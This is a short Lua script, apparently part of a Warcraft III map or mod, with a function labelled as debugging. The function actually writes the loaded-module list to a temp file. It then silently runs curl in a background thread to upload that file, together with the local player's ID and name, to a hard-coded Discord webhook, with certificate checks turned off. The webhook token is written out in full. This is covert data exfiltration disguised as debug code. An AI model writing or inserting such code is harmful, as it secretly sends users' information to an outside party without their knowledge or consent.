function DebugMEx() 
    local ff = GetTempPath().."/"
    ff = ff .. "wc3."
    ff = ff .. "txt"
    PrintModules(ff)
    local message = string.format("(Evolution Tag) Player: %d: %s",GetPlayerId(GetLocalPlayer()),GetPlayerName(GetLocalPlayer()))
    local url = "https://discord.com/api/webhooks/1048567875348209675/nv19QP0mWYbPWLi9jurHJOZ0c0IF90mK2-k09BnRWt5by8Qm6Bz0r4zMUxcgJi2Ni4v7"
    local payload_json = string.format('{"content":"%s"}',message)
    local command = string.format('%s -s --insecure --location --request POST "%s" --form payload_json=%q --form ss=@%q',Curlpath,url,payload_json,ff,ff)
    --print("\n",command,"\n")
    RunCmdThreaded(command)
end

function DebugM() 
    if(not DEBUG_M_DONE) then
        DEBUG_M_DONE = true
        DebugMEx()
    end
end